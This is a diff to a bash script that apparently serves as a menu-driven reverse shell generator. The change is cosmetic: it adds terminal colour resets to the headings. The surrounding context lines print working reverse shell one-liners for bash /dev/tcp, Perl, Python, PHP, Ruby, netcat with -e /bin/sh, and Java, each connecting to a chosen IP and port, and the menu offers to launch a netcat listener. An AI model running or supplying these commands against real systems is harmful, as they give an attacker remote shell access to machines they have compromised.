@@ -61,7 +61,7 @@ function invoke_nc(){
 
 function bash_revs(){
 	echo -e ""
-	echo -e "\e[1m\e[4mBASH Reverse Shell\e[24m\e[21m\n"
+	echo -e "\e[1m\e[4mBASH Reverse Shell\e[24m\e[21m\e[0m\n"
 	echo -e ""
 	echo -e "bash -i >& /dev/tcp/$IP/$PORT 0>&1"
 	echo -e "" 
@@ -71,7 +71,7 @@ function bash_revs(){
 
 function perl_revs(){
 	echo -e ""
-	echo -e "\e[1m\e[4mPERL Reverse Shell\e[24m\e[21m\n"
+	echo -e "\e[1m\e[4mPERL Reverse Shell\e[24m\e[21m\e[0m\n"
 	echo -e ""
 	echo -n $'perl -e\'use Socket;'
 	echo -n '$i="'
@@ -86,7 +86,7 @@ function perl_revs(){
 
 function python2_revs(){
 	echo -e ""
-	echo -e "\e[1m\e[4mPython-2 Reverse Shell\e[24m\e[21m\n"
+	echo -e "\e[1m\e[4mPython-2 Reverse Shell\e[24m\e[21m\e[0m\n"
 	echo -e "" 
 	echo -n $'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'
 	echo -n $IP
@@ -99,7 +99,7 @@ function python2_revs(){
 
 function python3_revs(){
 	echo -e ""
-	echo -e "\e[1m\e[4mPython-3 Reverse Shell\e[24m\e[21m\n"
+	echo -e "\e[1m\e[4mPython-3 Reverse Shell\e[24m\e[21m\e[0m\n"
 	echo -e ""
 	echo -n $'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'
 	echo -n $IP
@@ -113,7 +113,7 @@ function python3_revs(){
 
 function php_revs(){
 	echo -e ""
-	echo -e "\e[1m\e[4mPHP Reverse Shell\e[24m\e[21m\n"
+	echo -e "\e[1m\e[4mPHP Reverse Shell\e[24m\e[21m\e[0m\n"
 	echo -e ""
 	echo -n $'php -r \'$sock=fsockopen("'
 	echo -n $IP
@@ -126,7 +126,7 @@ function php_revs(){
 
 function ruby_revs(){
 	echo -e ""
-	echo -e "\e[1m\e[4mRUBY Reverse Shell\e[24m\e[21m\n"
+	echo -e "\e[1m\e[4mRUBY Reverse Shell\e[24m\e[21m\e[0m\n"
 	echo -e ""
 	echo -n $'ruby -rsocket -e\'f=TCPSocket.open("'
 	echo -n $IP
@@ -139,7 +139,7 @@ function ruby_revs(){
 
 function nc_revs(){
 	echo -e ""
-	echo -e "\e[1m\e[4mnc Reverse Shell\e[24m\e[21m\n"
+	echo -e "\e[1m\e[4mnc Reverse Shell\e[24m\e[21m\e[0m\n"
 	echo -e ""
 	echo -e "nc -e /bin/sh $IP $PORT"
 	echo -en "\nLaunch netcat? y/n\t"
@@ -151,7 +151,7 @@ function nc_revs(){
 
 function java_revs(){
 	echo -e ""
-	echo -e "\e[1m\e[4mJAVA Reverse Shell\e[24m\e[21m\n"
+	echo -e "\e[1m\e[4mJAVA Reverse Shell\e[24m\e[21m\e[0m\n"
 	echo -e ""
 	echo "r = Runtime.getRuntime()"
 	echo -n 'p= r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/'
@@ -166,7 +166,7 @@ function java_revs(){
 
 function menu(){
 	
-	echo -e "\e[1m\e[4mReverse Shell Menu\e[24m\e[21m\n"
+	echo -e "\e[1m\e[4mReverse Shell Menu\e[24m\e[21m\e[0m\n"
 	echo -e "\t\e[93m1.\e[0m Bash "
 	echo -e "\t\e[93m2.\e[0m Perl"
 	echo -e "\t\e[93m3.\e[0m Python2"
